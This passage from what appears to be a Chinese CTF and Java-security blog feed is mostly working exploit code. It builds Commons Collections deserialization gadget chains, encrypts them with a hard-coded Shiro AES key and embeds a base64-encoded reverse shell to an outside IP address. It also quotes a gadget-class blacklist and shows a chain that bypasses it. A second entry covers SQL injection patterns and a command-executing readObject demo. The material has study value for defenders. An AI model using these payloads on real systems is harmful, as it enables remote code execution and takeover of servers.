java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        System.setProperty(<span class="hljs-string">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-comment">//生成恶意代码</span><br>        ClassPool classPool = ClassPool.getDefault();<br>        CtClass ctClass =  classPool.makeClass(<span class="hljs-string">&quot;payload&quot;</span>);<br>        CtClass superClass = classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>        ctClass.setSuperclass(superClass);<br>        CtConstructor constructor = ctClass.makeClassInitializer();<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDcuMjM5LjMwLzIzMzMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        <span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br>        ctClass.writeFile();<br><br>        <span class="hljs-comment">//生成templatesImpl类</span><br>        TemplatesImpl templatesImpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-keyword">final</span> Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br><br>        <span class="hljs-comment">//防止expMap.put()操作发生报错，需要先用一个无关紧要的Transformer类</span><br>        ConstantTransformer constantTransformer = <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>);<br><br>        InstantiateTransformer instantiateTransformer = <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[] &#123; templatesImpl &#125;);<br><br>        <span class="hljs-keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, constantTransformer);<br><br>        <span class="hljs-comment">//将map设置为LazyMap，key设为TrAXFilter.class为了后续可以调用TrAXFilter的初始化方法从而执行TemplatesImpl.transformer()函数</span><br>        TiedMapEntry tideMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap,TrAXFilter.class);<br><br>        <span class="hljs-keyword">final</span> HashMap expMap = <span class="hljs-keyword">new</span> HashMap();<br>        expMap.put(tideMapEntry,<span class="hljs-string">&quot;kkfine&quot;</span>);<br><br>        <span class="hljs-comment">//避免map.containsKey(key)为True，无法进入if循环，也就无法触发transform</span><br>        lazyMap.clear();<br><br>        Field field = LazyMap.class.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(lazyMap,instantiateTransformer);<br><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br><br><span class="hljs-comment">//        ByteArrayInputStream in = new ByteArrayInputStream(barr.toByteArray());</span><br><span class="hljs-comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(in);</span><br><span class="hljs-comment">//        objectInputStream.readObject();</span><br><span class="hljs-comment">//        objectInputStream.close();</span><br><br>        <span class="hljs-keyword">byte</span>[] payloads = barr.toByteArray();<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        <span class="hljs-keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;7Bhs26ccN6i/0AT9GhZULF==&quot;</span>);<br>        ByteSource ciphertext = aes.encrypt(payloads, key);<br>        System.out.printf(ciphertext.toString());<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Base64Encode</span><span class="hljs-params">(ByteArrayOutputStream bs)</span></span>&#123;<br>        <span class="hljs-keyword">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());<br>        String s = <span class="hljs-keyword">new</span> String(encode);<br>        System.out.println(s);<br>        System.out.println(s.length());<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj,String key, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(key);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj,value);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220524124142763.png" alt="image-20220524124142763"></p><h2 id="思路三（接一二）"><a href="#思路三（接一二）" class="headerlink" title="思路三（接一二）"></a>思路三（接一二）</h2><p>改造CC3，原本的cc3调用链如图。这里我们能够很显然想到将<code>ChainedTransformer</code>和<code>ConstatTransformer</code>这两个无关的类直接去掉不就行了。由于JDK8版本改写了AnnotationInvocationHandler类的readobject方法，所以使用<code>AnnotationInvocationHandler</code>这个类还是不可行。其实这里其实就回归到了思路一的问题了，这里是java8的版本。然后最终也也就回到了上面两个思路上，因为前两个思路其实都是在这条链上对于前半部分的处理不同。</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220524003152646.png" alt="image-20220524003152646"></p><p><img src="https://img-blog.csdnimg.cn/a5c3fcbc29d7499a9abf6f4d330d4369.png" alt="在这里插入图片描述"></p><h2 id="思路四（寻找CC链之外的类）"><a href="#思路四（寻找CC链之外的类）" class="headerlink" title="思路四（寻找CC链之外的类）"></a>思路四（寻找CC链之外的类）</h2><p>寻找CC链之外的类，这个就比较进阶了，需要自己找链子。对于本菜鸡来讲还触摸不到，但是由于看了前段时间MRCTF一些大佬的wp发现可以直接利用。</p><p>这里用的是<code>Y4tacker</code>大佬的链子也能直接打。</p><p><a href="https://github.com/Y4tacker/CTFBackup/tree/main/2022/2022MRCTF">https://github.com/Y4tacker/CTFBackup/tree/main/2022/2022MRCTF</a></p><p>因为MRCTF那道题的过滤非常严格，基本上把能用的CC链的类都给ban掉了，具体可见</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;blacklist&gt;<br>&lt;!-- ysoserial<span class="hljs-string">&#x27;s CommonsCollections1,3,5,6 payload --&gt;</span><br><span class="hljs-string">&lt;regexp&gt;org\.apache\.commons\.collections\.Transformer$&lt;/regexp&gt; &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.InvokerTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.ChainedTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.ConstantTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.InstantiateTransformer$&lt;/regexp&gt;</span><br><span class="hljs-string">&lt;!-- ysoserial&#x27;</span>s CommonsCollections2,<span class="hljs-number">4</span> payload --&gt;<br>&lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.InvokerTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.ChainedTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.ConstantTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.InstantiateTransformer$&lt;/regexp&gt; &lt;regexp&gt;org\.apache\.commons\.collections4\.comparators\.TransformingComparator$&lt;/regexp&gt;<br>&lt;/blacklist&gt;<br></code></pre></div></td></tr></table></figure><p>所以这里需要找到另外的类来替换，不过那题其实预期解是<code>aspectJweaver任意写fat jar 触发rce</code>。这里根据大佬解法提到了三个类</p><h3 id="FactoryTransformer"><a href="#FactoryTransformer" class="headerlink" title="FactoryTransformer"></a>FactoryTransformer</h3><p>这个类的内容很简单，<code>transform</code>方法可以调用Factory子类的<code>create()</code>方法</p><p><img src="https://img-blog.csdnimg.cn/bd50dc67cf0c43a69e9812130001dd5e.png" alt="在这里插入图片描述"></p><h3 id="ConstantFactory"><a href="#ConstantFactory" class="headerlink" title="ConstantFactory"></a>ConstantFactory</h3><p>这个类可以返回任意类，可替换<code>ConstantTransformer</code>。不过这里其实用不上这个</p><p><img src="https://img-blog.csdnimg.cn/2a64c70134e24c15bc088b82d09a79b9.png" alt="在这里插入图片描述"></p><h3 id="InstantiateFactory"><a href="#InstantiateFactory" class="headerlink" title="InstantiateFactory"></a>InstantiateFactory</h3><p>这个类里就有<code>create()</code>方法，并且可以实例化任意类，是不是发现和<code>InstantiateTransformer</code>很相似。</p><p><img src="https://img-blog.csdnimg.cn/1d71f2ddc1c442dfb1041de0ea5ff825.png" alt="在这里插入图片描述"></p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>后半部分就可以拼接<code>TrAXFilter</code>和<code>TemplatesImpl</code>那一部分来执行恶意代码。具体整理调用链如下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">readObject()<br>-&gt;java.util.HashMap.put()<br>-&gt;java.util.HashMap.hash()<br>-&gt;org.apache.commons.collections.keyvalue.TiedMapEntry.hashcode()<br>-&gt;org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>-&gt;org.apache.commons.collections.map.LazyMap.get()<br>-&gt;org.apache.commons.collections.functors.FactoryTransformer.transform()<br>-&gt;org.apache.commons.collections.functors.InstantiateFactory-&gt;create()<br>-&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.TrAXFilter()<br>-&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()<br></code></pre></div></td></tr></table></figure><p>最终exp</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ezcc.exp;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.FactoryTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateFactory;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><span class="hljs-keyword">import</span> org.nibblesec.tools.SerialKiller;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;<br>                ClassPool.getDefault().get(HelloTemplatesImpl.class.getName()).toBytecode( )<br>        &#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        InstantiateFactory instantiateFactory;<br>        instantiateFactory = <span class="hljs-keyword">new</span> InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class,<span class="hljs-keyword">new</span> Class[]&#123;javax.xml.transform.Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;);<br><br>        FactoryTransformer factoryTransformer = <span class="hljs-keyword">new</span> FactoryTransformer(instantiateFactory);<br>        ConstantTransformer constantTransformer = <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> HashMap();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        setFieldValue(outerMap,<span class="hljs-string">&quot;factory&quot;</span>,factoryTransformer);<br>        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(expMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] payloads = byteArrayOutputStream.toByteArray();<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        <span class="hljs-keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;7Bhs26ccN6i/0AT9GhZULF==&quot;</span>);<br>        ByteSource ciphertext = aes.encrypt(payloads, key);<br>        System.out.printf(ciphertext.toString());<br><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> SerialKiller(byteArrayInputStream, <span class="hljs-string">&quot;F:\\javaweb\\cvdd_ezcc\\src\\main\\resources\\serialkiller.conf&quot;</span>);<br>        ois.readObject();<br>        ois.close();<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cc3</title>
    <link href="/2022/03/15/2022-3-15-cc3/"/>
    <url>/2022/03/15/2022-3-15-cc3/</url>
    
    <content type="html"><![CDATA[<p>参考：</p><p><a href="https://xz.aliyun.com/t/7945#toc-27">https://xz.aliyun.com/t/7945#toc-27</a></p><p><a href="https://www.cnblogs.com/liudaihuablogs/p/14167448.html">https://www.cnblogs.com/liudaihuablogs/p/14167448.html</a></p><p>开始万恶的javaweb安全学习之旅（哭泣）</p><h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h1><p>可参考<a href="https://b1ngz.github.io/java-sql-injection-note/">https://b1ngz.github.io/java-sql-injection-note/</a></p><ol><li><p><strong>直接拼接，未进行过滤</strong></p><p>将<code>request.getParameter(&quot;&quot;)</code>直接放在SQL语句。</p><p>全局搜索查看：<code>String sql</code>等。</p></li></ol><p><img src="https://img-blog.csdnimg.cn/64300da5efe04ed4852c4683d714c2f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        PrintWriter out = resp.getWriter();<br>        Enumeration parameterNames=req.getParameterNames();<br>        System.out.println(parameterNames);<br>        <span class="hljs-keyword">while</span> (parameterNames.hasMoreElements())&#123;<br>            String t = (String) parameterNames.nextElement();<br>            <span class="hljs-keyword">if</span>(t.equals(<span class="hljs-string">&quot;username&quot;</span>))&#123;<br>                useranme = req.getParameter(t).trim();<br>                out.write(<span class="hljs-string">&quot;&lt;p1&gt;&quot;</span> + <span class="hljs-string">&quot;username:&quot;</span> + useranme + <span class="hljs-string">&quot;&lt;/p1&gt;&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (t.equals(<span class="hljs-string">&quot;password&quot;</span>))&#123;<br>                password = req.getParameter(t).trim();<br>                out.write(<span class="hljs-string">&quot;&lt;p1&gt;&quot;</span> + <span class="hljs-string">&quot;password:&quot;</span> + password + <span class="hljs-string">&quot;&lt;/p1&gt;&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                out.write(<span class="hljs-string">&quot;only user pass&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//        System.out.println(param);</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            login(useranme,password);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><ol><li><p><strong>%和_</strong></p><p>没有手动过滤%。预编译是不能处理这个符号的， 所以需要手动过滤，否则会造成慢查询，造成 dos。</p></li><li><p><strong>Order by、from等无法预编译</strong></p><p>如以下示例，需要手动过滤，否则存在sql注入。</p><p><code>String sql = &quot;Select * from news where title =?&quot; + &quot;order by &#39;&quot; + time + &quot;&#39; asc&quot;</code></p></li><li><p><strong>Mybatis 框架</strong></p><p>使用注解或者xml将java对象与数据库sql操作对应。</p><p>在注解中或者 Mybatis 相关的配置文件中搜索 $ 。然后查看相关 sql 语句上下文环境。</p><p><strong>mybatis简单示例</strong></p><ul><li>mybatis的maven配置</li></ul><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></div></td></tr></table></figure></li></ol><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>可参考</p><p><a href="https://xz.aliyun.com/t/2041">https://xz.aliyun.com/t/2041</a></p><p><a href="https://xz.aliyun.com/t/7031">https://xz.aliyun.com/t/7031</a></p><p>首先，一个类的对象要想序列化成功，必须满足两个条件：</p><ol><li>该类必须实现 java.io.Serializable 接口。</li><li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li></ol><p>在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。</p><p>一个简单得样例，通过重写readObject方法，在其中执行命令达到触发漏洞效果。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> serialize;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">//读取输入流,并转换对象</span><br><span class="hljs-comment">//        Scanner input = new Scanner(System.in);</span><br><span class="hljs-comment">//        InputStream in= request.getInputStream();</span><br><span class="hljs-comment">//        ObjectInputStream ois = new ObjectInputStream(in); //恢复对象</span><br><span class="hljs-comment">//        ois.readObject();</span><br><span class="hljs-comment">//        ois.close();</span><br>        SerialObject s = <span class="hljs-keyword">new</span> SerialObject(<span class="hljs-number">12</span>,<span class="hljs-string">&quot;KKfine&quot;</span>);<br>        FileOutputStream fileOut = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./ test.ser&quot;</span>);<br>        ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(fileOut);<br>        out.writeObject(s);<br>        fileOut.close();<br>        System.out.println(<span class="hljs-string">&quot;serialize ok &quot;</span>);<br><br>        SerialObject p = <span class="hljs-keyword">null</span>;<br>        FileInputStream filein = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./test.ser&quot;</span>);<br>        ObjectInputStream in = <span class="hljs-keyword">new</span> ObjectInputStream(filein);<br>        p = (SerialObject) in.readObject();<br>        in.close();<br>        filein.close();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SerialObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> seriaverionuid = <span class="hljs-number">513134543743755L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">SerialObject</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id,String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span><span class="hljs-keyword">throws</span> IOException,ClassNotFoundException</span>&#123;<br>        in.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;notepad.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>序列化数据通常以<code>AC ED</code>开始，之后的两个字节是版本号，版本号一般是<code>00 05</code>但在某些情况下可能是更高的数字。</p><p>Java类名称可能会以“L”开头的替代格式出现 ，以’;’结尾 ，并使用正斜杠来分隔命名空间和类名（例如 “Ljava / rmi / dgc / VMID;”）。除了Java类名，由于序列化格式规范的约定，还有一些其他常见的字符串，例如 ：表示对象（TC_OBJECT），后跟其类描述（TC_CLASSDESC）的’sr’或 可能表示没有超类（TC_NULL）的类的类注释（TC_ENDBLOCKDATA）的’xp’。</p><p>序列化数据信息是将对象信息按照一定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。并且有大牛写好了现成的工具-<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a></p><p>在实战过程中，我们可以通过tcpdump抓取TCP/HTTP请求，通过<a href="https://github.com/NickstaDB/SerialBrute/">SerialBrute.py</a>去自动化检测，并插入ysoserial生成的exp</p><p><img 